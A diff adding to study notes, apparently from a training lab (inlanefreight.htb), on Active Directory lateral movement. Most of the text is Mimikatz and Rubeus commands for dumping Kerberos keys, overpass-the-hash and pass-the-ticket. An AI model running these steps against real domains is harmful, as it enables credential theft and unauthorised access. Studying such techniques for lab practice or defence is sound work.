@@ -15,4 +15,49 @@ Option 2) Extract the tickets using Rubeus
 
 ====================================================================================================================================
 
-We can use the 
+We can use the  Pass the Key or OverPass the Hash to convert hash/key for a domain-joined user to get the DC access. 
+
+Step 1) Extarct Kerberos keys using Mimikatz
+                    c:\tools> mimikatz.exe
+                    mimikatz # privilege::debug
+                    mimikatz # sekurlsa::ekeys
+
+Step 2) Passing the key or Overpass the hash to get a new CMD promt 
+          Option 1) Using Mimikatz for this. 
+                    c:\tools> mimikatz.exe
+                    mimikatz # privilege::debug
+                    mimikatz # sekurlsa::pth /domain:<Doamin> /user:<username> /ntlm:<NT hash of user from step 1>
+                   
+
+          Option 2) Using Rubeus for this.
+                    c:\tools> Rubeus.exe  asktgt /domain:<Domain> /user:<Username> /aes256:<Hash of the user from step 1> /nowrap
+
+ Note :- After doint the above steps, we will get the new CMD promt promted with the new access. 
+
+
+====================================================================================================================================
+
+Now we have the Kerberos tickeyts, we can use them for moving laterally. 
+
+Option 1) Using Rubeus to pass the ticket.          
+         c:\tools> Rubeus.exe asktgt /domain:<Domain> /user:<username> /rc4:<RC4 hash of the user> /ptt
+                    The above command will ask for the TGT 
+
+Option 2) Using Rubeus with the kirbi file which we got in the initiall step used in "Extract the tickets using Mimikatz" 
+          c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+
+Option 3) We can pass the ticket on Base 64. 
+          Step 1) First we need to covert kirbi ticket to base64 format. 
+                    PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
+          Step 2) Once we have the ticket base64 format, we can pass the ticket using Rubeus
+                    c:\tools> Rubeus.exe ptt /ticket:<Base64 from step 1>
+
+Option 4) Lets use Mimikatz to pass the ticket using the kirbi ticket.
+          C:\tools> mimikatz.exe 
+          mimikatz # privilege::debug
+          mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+
+ 
+
+          
+
